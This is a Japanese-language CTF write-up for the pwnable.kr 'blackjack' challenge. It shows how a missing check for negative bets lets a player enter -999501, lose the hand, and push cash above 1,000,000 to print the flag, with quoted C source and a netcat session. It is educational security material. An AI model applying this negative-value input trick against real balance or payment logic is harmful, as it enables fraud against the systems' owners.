---
title: Pwnable.kr 「blackjack (Toddler's Bottle)」Writeup
description: 不十分な入力検証により負数の入力が可能になることで値を改竄できる問題
date: 2026-10-06 20:46:00 +0900
categories: [CyberSecurity, CTF]
tags: [pwnable_kr, misc, improper_input_validation]
image:
  path: /assets/img/ctf/pwnable_kr/blackjack.png
  alt: pwnable_kr_blackjack_icon
---

# pwnable_kr-blackjack

## Summary

本問は，不十分な入力検証により負数の入力が可能になることで値を改竄できる問題です．

> - **Category**: Misc
> - **Description**: Hey! check out this C implementation of blackjack game!
> I found it online
> http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html
> I like to give my flags to millionares.
> how much money you got?
> - **Tools & TechStack**:
> 	- C
> - **Release**: `N/A`
{: .prompt-info }


**配布ファイル**
```txt
.
├── blackjack
├── blackjack.c
├── Dockerfile
├── flag
├── readme
└── run.sh

1 directory, 6 files
```

---
## ソースコードの解析

> トランプを使ってディーラー (親) と勝負するカジノの定番カードゲームです．  
> 手札の合計を21に近づけ，21を超えずにディーラーより大きい数にすれば勝ちになります．
{: .prompt-info }

- **I like to give my flags to millionares. how much money you got?**
- **僕は自分の旗を大富豪たちにあげるのが好きなんだ．君はいくらお金を持っているの?**

問題の説明文に上記のような記載がされています．  
推測ですが，特定の金額を上回るようにロジックバイパスやメモリ破壊を行えば，Flagが取得できるのではないかと考えました．

> `blackjack.c` 本体が700行以上あるため，全文は載せていません．
{: .prompt-info }

実際に，`money` という単語で検索をかけると，周辺にターゲットになりそうなロジックが見つかりました．  

- `cash_test()`: `if (cash > 1000000)` という `flag` ファイルが見れるようになる条件が指定されています．  
- `betting()`: `if (bet > cash)` というロジックで，自分の所持金以上にベットできないようにしてあります．

```c
//...
int cash = 500;
int bet;
//...
void cash_test() //Test for if user has cash remaining in purse
{
     if (cash <= 0) //Once user has zero remaining cash, game ends and prompts user to play again
     {
        printf("You Are Bankrupt. Game Over");
        cash = 500;
        askover();
     }
     if (cash > 1000000){
     	FILE* fp=fopen("flag", "r");
	char buf[100];
	memset(buf, 0, 100);
	fread(buf, 1, 100, fp);
	printf("%s\n", buf);
	fclose(fp);
     }
} // End Function
 
int betting() //Asks user amount to bet
{
 printf("\n\nEnter Bet: $");
 scanf("%d", &bet);
 
 if (bet > cash) //If player tries to bet more money than player has
 {
        printf("\nYou cannot bet more money than you have.");
        printf("\nEnter Bet: ");
        scanf("%d", &bet);
        return bet;
 }
 else return bet;
} // End Function
//..
```

## 負数同士の積が正になることを利用した点数の獲得

ゲームに勝ち続ける方法で点数を `1000000` 点以上稼ぐのは現実的ではないため，これらのロジックを悪用して，点数を改竄する方法を探ります．  
とりあえず，思いついた方法が実際に可能であるかを調査します．

```c
//...
int cash = 500;
int bet;
//...
void play()
{
//...
        if (p > 21) // If player total is over 21, loss
        {
            printf("\nWoah Buddy, You Went WAY over.\n");
            loss = loss + 1;
            cash = cash - bet;
            printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
            dealer_total = 0;
            askover();
        }
//...
}
```

自分の所持金以上にベットできないようにする処理は，`if (bet > cash)` であり，これはマイナスの値を確認していません．  
`play()` の負けた時の条件分岐 (`loss`) において，`cash = cash - bet` が計算されます．  
そのため，`bet` が負の数のとき，`cash = cash - (-bet)` となり，`bet` 分が現在の `cash` に加算されることになります．  

後は，`500 - (-bet) > 1000000` を満たす `bet` を求めればいいことになります．  
境界を攻めるのであれば，`500 - (-999501) = 1000001` なので，`-999501` を入力して，負けることでFlagが獲得できます．

```shell
$ nc pwnable.kr 10010
#...
Cash: $500
-------
|D    |
|  K  |
|    D|
-------

Your Total is 10

The Dealer Has a Total of 1

Enter Bet: $-999501


Would You Like to Hit or Stay?
Please Enter H to Hit or S to Stay.
S

You Have Chosen to Stay at 10. Wise Decision!

The Dealer Has a Total of 4
The Dealer Has a Total of 7
The Dealer Has a Total of 10
The Dealer Has a Total of 13
The Dealer Has a Total of 16
The Dealer Has a Total of 19
Dealer Has the Better Hand. You Lose.

You have 0 Wins and 1 Losses. Awesome!

Would You Like To Play Again?
Please Enter Y for Yes or N for No
Y
<REDACTED>


Cash: $1000001
-------
|C    |
|  3  |
|    C|
-------

Your Total is 3

The Dealer Has a Total of 3
```

---
## Post-Mortem & Dead ends

### `cash` のアンダーフローを利用する方法の検証

最初に，`cash` のアンダーフローによる正の巨大数への反転で解こうとしましたが，以下に示す理由でできませんでした．  

一般的な環境下における `int` 型の範囲は，`[-2147483648, 2147483647]` です．  

巨大な正の数にさせるには，`cash` をいったん `INT_MIN` より下まで突き抜けさせて，**ラップアラウンドで正に回り込ませる** しかありません．  
しかし，`cash` の初期値が `500` 円あるせいで，1度の入力における最小値の `-2147483648` を入力したうえで，`win()` に到達させて `cash = cash + bet` をさせても，`-2147483648 + 500 = -2147483148` となってしまい，`INT_MIN` を下回らせることができません．

```c
void cash_test() // Test for if user has cash remaining in purse
{
    if (cash <= 0) // Once user has zero remaining cash, game ends and prompts user to play again
    {
        printf("You Are Bankrupt. Game Over");
        cash = 500;
        askover();
    }
    if (cash > 1000000)
    {
        FILE *fp = fopen("flag", "r");
        char buf[100];
        memset(buf, 0, 100);
        fread(buf, 1, 100, fp);
        printf("%s\n", buf);
        fclose(fp);
    }
} // End Function
```

また，複数ラウンドにおいても，`cash_test()` の `if (cash <= 0)` によって，ラウンド開始時に負の `cash` は `500` に上書きされるため，負数の `cash` を持ち越すことができません．  

結果として，この経路は成り立ちませんでした．

## References

N/A